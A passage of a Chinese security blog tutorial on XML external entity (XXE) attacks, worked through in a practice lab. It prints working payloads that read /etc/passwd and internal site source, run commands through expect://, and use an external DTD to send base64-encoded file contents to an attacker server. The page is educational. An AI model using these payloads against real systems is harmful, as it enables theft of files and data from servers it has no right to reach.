+<p>直接回显flag，没什么深奥的<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_17.png" alt="在这里插入图片描述"></p>
+<p>搞掂，收工</p>
+<hr>
+<h2 id="0x05-使用XXE利用php伪协议读取文件"><a href="#0x05-使用XXE利用php伪协议读取文件" class="headerlink" title="0x05.使用XXE利用php伪协议读取文件"></a>0x05.使用XXE利用php伪协议读取文件</h2><p>相比较file伪协议，PHP伪协议可以对读取出的文件进行数据编码。在XXE漏洞的基础上，使用PHP伪协议对文件进行读取并编码。</p>
+<p>由上题可以存在ssrf漏洞，现在我们的目标是使用php伪协议读取内网（10.1.2.3）的网站源代码</p>
+<p>疑问解答：不是由cmd命令执行吗？为什么不可以直接cat网站原码？（如下图）</p>
+<p>存在index.php<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_18.png" alt="在这里插入图片描述"></p>
+<p>cat+index.php 返回结果为空<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_19.png" alt="在这里插入图片描述"></p>
+<p>payload：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=http://10.1.2.3/?cmd=cat+index.php&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_20.png" alt="在这里插入图片描述"></p>
+<p>搞掂，收工</p>
+<hr>
+<h2 id="0x06-XXE命令执行"><a href="#0x06-XXE命令执行" class="headerlink" title="0x06.XXE命令执行"></a>0x06.XXE命令执行</h2><ul>
+<li><strong>expect:&#x2F;&#x2F;</strong><br>由expect:&#x2F;&#x2F;封装协议打开的数据流PTY通过提供了对进程stdio、stdout和stderr的访问。<br>expert:&#x2F;&#x2F;封装协议默认未开启，为了使用，必须靶机中安装有效的Expect扩展。</li>
+</ul>
+<p><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_21.png" alt="在这里插入图片描述"></p>
+<p>理论payload：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;excpect://id&quot;</span>&gt;</span>]&gt;</span>   //其中id是命令</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_22.png" alt="在这里插入图片描述"></p>
+<p>删除 <code>&lt;?xml version=&quot;1.0&quot;?&gt;</code> 就可以了，可能是靶场环境问题，忽略<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_23.png" alt="在这里插入图片描述"></p>
+<p>靶场没有被指expect:&#x2F;&#x2F;环境，所以无法演示其他命令，只是做了“假执行”，收工</p>
+<hr>
+<h2 id="0x07-无回显XXE带外数据"><a href="#0x07-无回显XXE带外数据" class="headerlink" title="0x07.无回显XXE带外数据"></a>0x07.无回显XXE带外数据</h2><ol>
+<li>dnslog 验证xxe漏洞是否存在</li>
+<li>外带数据</li>
+</ol>
+<p>dnslog 验证payload</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://xxxxxx.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_24.png" alt="在这里插入图片描述"></p>
+<p>dnslog有查询记录，说明有访问外网<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_25.png" alt="在这里插入图片描述"></p>
+<p>如果不确定目标服务器能不能做域名解析，实际上可以直接访问我们攻击服务器的攻击端点，然后查看日志（如下图）<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_26.png" alt="在这里插入图片描述"></p>
+<p>错误的数据外带payload：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">send</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://&lt;攻击服务器&gt;/%file;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>当解析器读到下面这一行，即<code>&lt;!ENTITY % send SYSTEM &quot;http://&lt;攻击服务器&gt;/%file;&quot;&gt;</code> ，不会把 <strong>%file</strong> 替换成 <strong>&#x2F;etc&#x2F;passwd</strong> 的内容，而是把它当成一个普通的字符串 。<strong>因为</strong>： <code>内部DTD禁止参数实体内再次调用参数实体</code>，<strong>但是</strong>：<code>外部DTD可以重复调用参数实体，允许参数实体调用其他参数实体</code></p>
+<p>第一部分payload：evil.dtd</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 1. 读取文件并进行 Base64 编码 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 2. 嵌套构造外发实体（注意 &amp;#x25; 是 % 的编码） --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.34.128:8888/?data=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 3. 执行 eval，生成 send 实体 --&gt;</span></span><br><span class="line">%eval;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 4. 执行 send，触发外发请求 --&gt;</span></span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>
+
+<p>如kail做攻击服务器<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_27.png" alt="在这里插入图片描述"></p>
+<p>第二部分payload：burp发送</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.34.128:8080/evil.dtd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>burp发送payload后<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_28.png" alt="在这里插入图片描述"></p>
+<p>成功外带数据，收工</p>
+<hr>
+<h2 id="0x08-Xinclude"><a href="#0x08-Xinclude" class="headerlink" title="0x08.Xinclude"></a>0x08.Xinclude</h2><p>XML 的 XInclude 机制与 PHP 的 include、Python&#x2F;Java 的 import 类似，本质上都是一种 文件包含 机制。其核心作用在于：将通用组件（如函数定义、配置片段）抽取为独立文件，在需要时动态引入。</p>
+<ul>
+<li>避免冗余：无需在每个文件中重复编写相同代码；</li>
+<li>提升可维护性：修改公共逻辑时只需更新一处；</li>
+<li>增强可读性：主文件结构更清晰，只保留核心逻辑。</li>
+</ul>
+<p>例如，PHP 中可将功能函数集中放在 function.php，再通过 include 引入使用；XML 中则可使用 <a href="xi:include">xi:include</a> 引用外部文档片段，实现模块化组合</p>
+<p>主文件：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 主文件 book.xml --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>我的书<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">&quot;chapter1.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>被包含文件：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 被包含文件 chapter1.xml --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">chapter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>第一章<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是第一章的内容。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">chapter</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>等效于：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>我的书<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">chapter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>第一章<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是第一章的内容。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">chapter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>外部实体：无法成为一个成熟的独立的XML文档，因为它既不允许独立的XML声明，也不允许Doctype声明。<br>xinclude：可以调用一个独立完整的XML内容。</p>
+</blockquote>
+<p>payload：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xxe</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">&quot;/etc/passwd&quot;</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">xxe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_29.png"></p>
+<p>搞定收工</p>
+<hr>
+<h2 id="0x09-使用SVG进行XXE漏洞利用"><a href="#0x09-使用SVG进行XXE漏洞利用" class="headerlink" title="0x09.使用SVG进行XXE漏洞利用"></a>0x09.使用SVG进行XXE漏洞利用</h2><p>SVG文件：可缩放矢量图形(Scalable Vector Graphics,SVG)基于XML 标记语言，用于描述二维的矢量图形。</p>
+<p>作为一个基于文本的开放网络标准，SVG能够优雅而简洁地渲染不同大小的图形，并和CSS、DOM、JavaScript和 SMIL等其他网络标准无缝衔接。本质上，SVG相对于图像，就好比HTML相对于文本。</p>
+<p>SVG图像及其相关行为被定义于XML文本文件之中，这意味着可以对它们进行搜索、索引、编写脚本以及压缩。此外，这也意味着可以使用任何文本编辑器和绘图软件来创建和编辑它们。</p>
+<p>将一个svg格式的图片以文本形式打开，实际上就是一堆xml代码，利用其特定注入payload</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">svg</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;2000px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1200px&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;white&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span> <span class="attr">font-family</span>=<span class="string">&quot;Courier&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;12&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;black&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_30.png" alt="在这里插入图片描述"></p>
+<p>收工</p>
+
+		  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+
+		  <script>
+		    // 计算字数与阅读时长，同时更新阅读进度条
+		    (function() {
+		      var content = document.querySelector('.mypage');
+		      if (content) {
+		        var text = content.innerText || content.textContent;
+		        // 中文字符（含 CJK 扩展区 + 标点），按字符计数
+		        var chineseChars = (text.match(/[一-鿿㐀-䶿豈-﫿　-〿＀-￯]/g) || []).length;
+		        // 英文/数字按字符计（非词），与 CSDN 统计方式一致
+		        var latinChars = (text.match(/[a-zA-Z0-9]/g) || []).length;
+		        var wordCount = chineseChars + latinChars;
+		        // 阅读时长：中文约 300 字/分钟，英文约 200 词/分钟
+		        var englishWords = (text.match(/[a-zA-Z0-9]+/g) || []).length;
+		        var readingTime = Math.max(1, Math.ceil(chineseChars / 300 + englishWords / 200));
+		        var wcEl = document.getElementById('word-count');
+		        var rtEl = document.getElementById('reading-time');
+		        if (wcEl) wcEl.textContent = '~' + wordCount + ' 字';
+		        if (rtEl) rtEl.textContent = '约 ' + readingTime + ' 分钟';
+		      }
+		      // 阅读进度条
+		      var bar = document.getElementById('reading-progress-bar');
+		      if (bar) {
+		        window.addEventListener('scroll', function() {
+		          var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+		          var docHeight = document.documentElement.scrollHeight - window.innerHeight;
+		          var progress = docHeight > 0 ? Math.min(100, (scrollTop / docHeight) * 100) : 0;
+		          bar.style.width = progress + '%';
+		        });
+		      }
+		    })();
+		  </script>
+		</div>
+
+		
+		<span id="" class="leancloud-visitors view" data-flag-title="XXE基础">
+			<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+		</span>
+		
+		
+		<div>
+	  	<center>
+
+		<div class="pagination">
+
+    
+    
+    <a href="/2026/07/27/神经网络基础/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2026/06/07/HookScripts/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+	    </center>
+		</div>
+
+		<!-- comment -->
+		
+			<section id="comments" class="comments">
+				<style>
+				.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+				@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+				</style>
+				<div id="vcomment" class="comment"></div>
+<script>
+// 延迟加载评论系统
+window.addEventListener('load', function() {
+  setTimeout(function() {
+    var script = document.createElement('script');
+    script.src = 'https://unpkg.com/valine@1.5.1/dist/Valine.min.js';
+    script.onload = function() {
+      var valineConfig = {"enable":true,"appId":"22F2XnoONZRtEbXvXO1SDcjS-gzGzoHsz","appKey":"bIFSRG6LeUO90VdfRBHUXNQs","placeholder":"说点什么吧~","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
+      valineConfig.el = '#vcomment';
+      valineConfig.recordIP = true;
+      valineConfig.serverURLs = 'https://22f2xnoo.api.lncldglobal.com';
+      new Valine(valineConfig);
+    };
+    document.head.appendChild(script);
+  }, 1000); // 延迟1秒加载
+});
+</script>
+			</section>
+		
+		
+		
+		</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+		<div id="side_meta">
+			<div class="col-md-3 sticky-meta" id="post_meta"> 
+
+	<!-- small fixed card (date + brief meta) -->
+	<div class="top-card">
+		<!-- date -->
+		
+		<div class="meta-widget">
+		<i class="fa fa-clock-o"></i>
+		2026-07-16
+		</div>
+		
+
+		<!-- brief categories/tags inside fixed card -->
+		
+		<div class="meta-widget small-cats">
+			<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>
+			<ul id="categorys" class="tag_box list-unstyled collapse in">
+				  
+  <li>
+    <li><a href="/categories/网络安全/">网络安全<span>44</span></a></li> <li><a href="/categories/网络安全/漏洞/">漏洞<span>12</span></a></li> <li><a href="/categories/网络安全/漏洞/WEB安全/">WEB安全<span>8</span></a></li> <li><a href="/categories/网络安全/漏洞/WEB安全/Top10/">Top10<span>8</span></a></li>
+  </li>
+
+			</ul>
+		</div>
+		
+
+		
+		<div class="meta-widget small-tags">
+			<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>
+			<ul id="tags" class="tag_box list-unstyled collapse in">
+				  
+  <li><a href="/tags/XXE/">XXE<span>1</span></a></li>
+			</ul>
+		</div>
+		
+	</div>
+
+	<!-- All Categories: sticky within sidebar area -->
+	<div class="category-stick" id="category-stick">
+		
+<div class="widget-wrap">
+  <h3 class="widget-title" style="font-family: monospace; font-size: 1.3em; font-weight: bold; color: #fff;">Categories</h3>
+  <div class="widget category-tree">
+    <ul class="hacker-category-list"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/408/">408</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/408/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/AI/">AI</a><span class="hacker-category-list-count">1</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/AI/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/">深度学习</a><span class="hacker-category-list-count">1</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/">CTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/">BUUCTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/PWN/">PWN</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/WEB/">WEB</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%9F%A5%E8%AF%86%E6%9D%82%E7%A2%8E/">知识杂碎</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/">Java</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/">python</a><span class="hacker-category-list-count">1</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="hacker-category-list-count">39</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/">SRC&渗透</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/SRC/">SRC</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/">内网</a><span class="hacker-category-list-count">3</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a><span class="hacker-category-list-count">20</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Linux/">Linux</a><span class="hacker-category-list-count">4</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/windows/">windows</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%89%8D%E7%AB%AF/">前端</a><span class="hacker-category-list-count">6</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%90%8E%E7%AB%AF/">后端</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E9%80%9A%E7%94%A8/">通用</a><span class="hacker-category-list-count">8</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/">漏洞</a><span class="hacker-category-list-count">12</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/PWN/">PWN</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/">WEB安全</a><span class="hacker-category-list-count">8</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/Top10/">Top10</a><span class="hacker-category-list-count">8</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/%E5%A4%8D%E7%8E%B0/">复现</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E8%AF%81%E4%B9%A6/">证书</a><span class="hacker-category-list-count">1</span></li></ul>
+  </div>
+</div>
+
+
+<style>
+/* Hacker / Terminal Style Category Tree */
+.category-tree .hacker-category-list {
+  padding-left: 20px;
+  font-family: 'Consolas', 'Courier New', monospace;
+  color: #fff;
+  list-style-type: circle; /* 'o' bullet */
+}
+
+.category-tree .hacker-category-list .hacker-category-list {
+  list-style-type: square; /* '■' bullet */
+}
+
+.category-tree .hacker-category-list .hacker-category-list .hacker-category-list {
+  list-style-type: square;
+}
+
+.category-tree .hacker-category-list-item {
+  margin: 6px 0;
+}
+
+.category-tree .hacker-category-list-link {
+  background-color: rgba(43, 188, 138, 0.1);
+  color: #2bbc8a;
+  text-decoration: none;
+  padding: 1px 6px;
+  font-weight: bold;
+  display: inline-block;
+}
+
+.category-tree .hacker-category-list-link:hover {
+  background-color: rgba(43, 188, 138, 0.2);
+  text-decoration: none;
+}
+
+.category-tree .hacker-category-list-count {
+  color: #2bbc8a;
+  margin-left: 5px;
+}
+</style>
+
+	</div>
+
+	<!-- article TOC placed below the category list; should scroll with page -->
+	<div class="toc-wrapper">
+		<div class="toc-widget">
+		
+			 <div class="toc">
+				 <span class="toc-title"><i class="fa fa-list"></i> Contents</span>
+				<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x00-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-article-text">0x00.基础知识</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x01-XXE%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA"><span class="toc-article-text">0x01 XXE漏洞演示</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x02-XXE%E4%BD%BF%E7%94%A8%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%A3%80%E7%B4%A2%E6%96%87%E4%BB%B6"><span class="toc-article-text">0x02.XXE使用外部实体检索文件</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x03-%E5%88%A9%E7%94%A8XXE%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-article-text">0x03.利用XXE参数实体读取文件</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x04-%E5%88%A9%E7%94%A8XXE%E8%BF%9B%E8%A1%8CSSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-article-text">0x04.利用XXE进行SSRF漏洞利用</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x05-%E4%BD%BF%E7%94%A8XXE%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-article-text">0x05.使用XXE利用php伪协议读取文件</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x06-XXE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-article-text">0x06.XXE命令执行</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" 